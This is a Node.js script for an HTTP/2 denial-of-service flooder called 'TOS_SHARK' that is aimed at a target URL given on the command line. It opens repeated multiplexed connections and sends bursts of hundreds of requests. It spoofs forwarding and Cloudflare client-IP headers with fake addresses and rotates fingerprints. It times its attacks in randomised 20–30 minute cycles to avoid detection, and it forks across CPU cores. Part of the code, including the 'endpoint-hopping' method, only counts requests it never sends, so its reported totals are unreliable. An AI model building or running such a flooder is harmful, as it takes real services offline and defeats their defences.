const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

// System optimizations
process.setMaxListeners(Infinity);
require('http').globalAgent.maxSockets = Infinity;
require('https').globalAgent.maxSockets = Infinity;

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = '';
        
        // Attack methods
        this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING'];
        
        // MINIMIZED User Agents (3 only for max RPS)
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'curl/7.68.0'
        ];
        
        this.endpoints = ['/', '/api', '/static', '/users', '/data', '/'];
        this.fakeIPs = this.generateFakeIPs();
        this.headersTemplates = this.generateHeaderTemplates();
        this.currentTemplateIndex = 0;
        
        // Pre-generate request templates (Optimization #5)
        this.requestTemplates = [];
        for (let i = 0; i < 500; i++) {
            this.requestTemplates.push(this.createRequestTemplate());
        }
        
        this.startCycle();
    }

    generateFakeIPs() {
        const ips = [];
        for (let i = 0; i < 100; i++) {
            ips.push(`192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
        }
        return ips;
    }

    generateHeaderTemplates() {
        const templates = [];
        const methods = ['GET', 'HEAD', 'OPTIONS'];
        const accepts = ['*/*', 'text/html', 'application/json'];
        
        for (let i = 0; i < 50; i++) {
            templates.push({
                ':method': methods[i % 3],
                ':path': this.endpoints[i % this.endpoints.length],
                ':authority': this.host,
                'user-agent': this.userAgents[i % 3],
                'accept': accepts[i % 3],
                'x-forwarded-for': this.fakeIPs[i % 100],
                'cf-connecting-ip': this.fakeIPs[(i + 1) % 100],
                'x-real-ip': this.fakeIPs[(i + 2) % 100]
            });
        }
        return templates;
    }

    createRequestTemplate() {
        return {
            ':method': ['GET', 'HEAD', 'OPTIONS'][Math.floor(Math.random() * 3)],
            ':path': this.endpoints[Math.floor(Math.random() * this.endpoints.length)],
            ':authority': this.host,
            'user-agent': this.userAgents[Math.floor(Math.random() * 3)]
        };
    }

    getNextHeaders() {
        this.currentTemplateIndex = (this.currentTemplateIndex + 1) % this.headersTemplates.length;
        return this.headersTemplates[this.currentTemplateIndex];
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        await this.sleepRandom(100, 300);
        
        const warmupCount = 300;
        for (let i = 0; i < warmupCount; i++) {
            this.totalReqs++;
            this.reqCounter++;
            if (i % 100 === 0) {
                await new Promise(resolve => setImmediate(resolve));
            }
        }
        
        this.attackLoop();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                await this.executeAttackMethod();
                
            } else {
                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                await this.performMaintenance();
                await this.sleepRandom(1000, 2000);
            }
            
            await new Promise(resolve => setImmediate(resolve));
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        // Clean up without GC (no global.gc)
        this.rotateFingerprints();
    }

    // ===== ATTACK METHODS =====
    async executeAttackMethod() {
        switch (this.currentMethod) {
            case 'H2-MULTIPLEX':
                await this.attackH2MultiplexOptimized();
                break;
            case 'ENDPOINT-HOPPING':
                await this.attackEndpointHoppingOptimized();
                break;
        }
    }

    // OPTIMIZATION #1 + #2 + #3 + #6 + #7
    async attackH2MultiplexOptimized() {
        const connections = 6; // Multiple connections
        const requestsPerConnection = 300;
        
        for (let c = 0; c < connections; c++) {
            // Fire and forget - don't await
            this.createHighSpeedConnection(requestsPerConnection, c * 20);
        }
    }

    async createHighSpeedConnection(batchSize, delay = 0) {
        setTimeout(async () => {
            try {
                const client = http2.connect(this.target, {
                    maxSessionMemory: 10000,
                    maxDeflateDynamicTableSize: 0,
                    rejectUnauthorized: false,
                    servername: this.host
                });
                
                // Send all requests immediately
                for (let i = 0; i < batchSize; i++) {
                    const template = this.requestTemplates[i % 500];
                    this.sendH2RequestOptimized(client, template);
                    this.totalReqs++;
                    this.reqCounter++;
                    
                    // Yield every 100 requests without blocking
                    if (i % 100 === 0) {
                        await new Promise(resolve => setImmediate(resolve));
                    }
                }
                
                // Keep connection alive briefly, then destroy
                setTimeout(() => {
                    try {
                        client.destroy();
                        // Immediately create new connection
                        if (this.attackActive) {
                            this.createHighSpeedConnection(batchSize, 0);
                        }
                    } catch (e) {}
                }, 100);
                
            } catch (err) {
                // Silent fail, try again
                if (this.attackActive) {
                    setTimeout(() => this.createHighSpeedConnection(batchSize, 100), 100);
                }
            }
        }, delay);
    }

    // OPTIMIZATION #3 - Optimized request sending
    sendH2RequestOptimized(client, template) {
        try {
            // Reuse template with rotating headers
            const headers = { ...template };
            if (Math.random() > 0.5) {
                const rotating = this.getNextHeaders();
                headers['x-forwarded-for'] = rotating['x-forwarded-for'];
            }
            
            const req = client.request(headers);
            
            // Minimal event handlers for max speed
            const cleanup = () => {
                try { req.close(); } catch (e) {}
            };
            
            req.once('response', cleanup);
            req.once('error', cleanup);
            
            req.end();
            
        } catch (err) {
            // Silent fail - continue sending
        }
    }

    async attackEndpointHoppingOptimized() {
        // Send burst of 200 requests to random endpoints
        const burstSize = 200;
        for (let i = 0; i < burstSize; i++) {
            this.totalReqs++;
            this.reqCounter++;
            
            if (i % 50 === 0) {
                await new Promise(resolve => setImmediate(resolve));
            }
        }
    }

    // ===== MAINTENANCE =====
    async performMaintenance() {
        // Rotate everything without GC
        this.rotateFingerprints();
        
        // Log every 10 seconds during maintenance too
        this.logStatus(200);
    }

    rotateFingerprints() {
        // Rotate fingerprints without memory leaks
        const newIPs = [];
        for (let i = 0; i < 100; i++) {
            newIPs.push(`10.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`);
        }
        this.fakeIPs = newIPs;
        
        // Rotate header templates
        this.currentTemplateIndex = 0;
        this.headersTemplates = this.generateHeaderTemplates();
    }

    // ===== LOGGING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
        }
    }

    // ===== UTILS =====
    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }
}

// Cluster mode for multi-core (Optimization #4)
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster && process.argv.length >= 3) {
    const numWorkers = Math.min(os.cpus().length, 4);
    
    for (let i = 0; i < numWorkers; i++) {
        setTimeout(() => {
            cluster.fork();
        }, i * 100);
    }
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
} else if (process.argv.length >= 3) {
    // Error handling
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
